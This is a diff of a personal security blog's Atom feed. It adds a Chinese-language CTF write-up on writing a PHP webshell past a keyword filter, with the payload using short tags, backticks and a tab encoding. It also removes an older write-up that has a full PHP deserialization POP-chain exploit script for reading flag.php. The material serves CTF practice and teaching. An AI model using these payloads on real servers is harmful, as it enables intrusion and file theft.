@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2022-02-11T15:10:10.433Z</updated>
+  <updated>2022-02-12T03:24:39.016Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>红明谷CTF 2021 write_shell_0x81-0x8F</title>
+    <link href="https://sakurahack-y.github.io/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/"/>
+    <id>https://sakurahack-y.github.io/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/</id>
+    <published>2022-02-12T02:43:03.000Z</published>
+    <updated>2022-02-12T03:24:39.016Z</updated>
+    
+    <content type="html"><![CDATA[<p>这道题属于比较简单的，让我们来看一下源码</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png" alt="image-20220212104506611"></p><p>当我们在后缀加上?action=pwd 就可以得到路径</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104652393.png" alt="image-20220212104652393"></p><p>再换成upload就可以写文件</p><p>?action=upload&amp;date=xxx</p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><p>PHP中，反引号可以起到命令执行的效果</p><p>空格可以用url编码绕过%09</p><p>由这个我们就可以构造出payload</p><pre><code>?action=upload&amp;data=&lt;?=%09`whoami`?&gt;</code></pre><p>访问文件</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212110632709.png" alt="image-20220212110632709"></p><p>成功执行了命令</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111111008.png" alt="image-20220212111111008"></p><p>直接获取根目录所有文件信息，访问文件，获得flag</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111030856.png" alt="image-20220212111030856"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;这道题属于比较简单的，让我们来看一下源码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png&quot; </summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
+    
+    
+    <category term="writeshell" scheme="https://sakurahack-y.github.io/tags/writeshell/"/>
+    
+  </entry>
   
   <entry>
     <title>计算机组成原理</title>
@@ -529,33 +556,6 @@
     
     
     <category term="ssi" scheme="https://sakurahack-y.github.io/tags/ssi/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MRCTF2020-Ezpop</title>
-    <link href="https://sakurahack-y.github.io/2021/10/13/MRCTF2020-Ezpop/"/>
-    <id>https://sakurahack-y.github.io/2021/10/13/MRCTF2020-Ezpop/</id>
-    <published>2021-10-12T17:05:15.000Z</published>
-    <updated>2021-10-12T17:41:01.679Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="MRCTF2020-Ezpop"></a>MRCTF2020-Ezpop</h1><p>打开网页，代码如下：</p><pre><code>Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)&#123;        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125; </code></pre><p>下面是本题一些魔术方法的介绍：</p><pre><code>__construct 当一个对象创建时被调用，__toString 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__get() 用于从不可访问的属性读取数据#难以访问包括：（1）私有属性，（2）没有初始化的属性__invoke() 当脚本尝试将对象调用为函数时触发。</code></pre><p>首先观察敏感函数，在Modifier中发现敏感函数include(),这应该是一个可利用点。问题的关键点就算如何调用Modifier中的include()函数。可以看到里面有一个魔术方法：__invoke(),当脚本尝试将对象调用为函数时触发，那么问题就转化为如何通过构建pop链来触发这个函数。</p><p>Show类中 __ construct并没有什么用。但我们发现了一个敏感点, __ toString魔术方法。它的作用主要就是能echo一个实例化的类（如果这个类没有 __ toString()，则会报错），因为echo时会自动调用__toString()。那么我们看如何才能调用这个魔术方法呢？</p><p>我们发现show类中还有一个过滤：</p><pre><code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code></pre><p>preg_match（）函数用到source，如果source是字符串，则直接拿来匹配。<br> 如果source是一个类且这个类里有__ toString()方法，则会调用__ toString()。</p><p>所以我们应该使source为一个类来调用__ toString 方法。</p><p>source = new Show();</p><p>调用__ toString后会返回这个：</p><pre><code> return $this-&gt;str-&gt;source;</code></pre><p>我们要考虑该如何利用这个。</p><p>如果令 $this-&gt;str = new Test(),Test()类中没有source,则会自动调用 __ get(),返回一个变量加括号，即函数 $p()。如果我们再让$p = new Modifier()。则相当于返回一个类函数，则会调用Modifier的 __invoke() ，用 $var读取flag.php即可.</p><p>payload:</p><pre><code>&lt;?phpclass Modifier &#123;    protected  $var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;public function __construct($file=&#39;index.php&#39;)&#123;    $this-&gt;str = new Test();    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;&#125;$a = new Show();$a-&gt;source = new Show();$a-&gt;source-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($a));?&gt;</code></pre><p>思考：为什么这里要用urlencode编码进行加密？</p><p>因为$var是protected 类型，序列化后要手动加一些字符才能通过。</p><p>贴一段代码：</p><p><img src="/2021/10/13/MRCTF2020-Ezpop/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;MRCTF2020-Ezpop&quot;&gt;&lt;a href=&quot;#MRCTF2020-Ezpop&quot; class=&quot;headerlink&quot; title=&quot;MRCTF2020-Ezpop&quot;&gt;&lt;/a&gt;MRCTF2020-Ezpop&lt;/h1&gt;&lt;p&gt;打开网页，代码如下：&lt;/p&gt;
-&lt;pr</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
-    
-    
-    <category term="反序列化" scheme="https://sakurahack-y.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
   </entry>
   
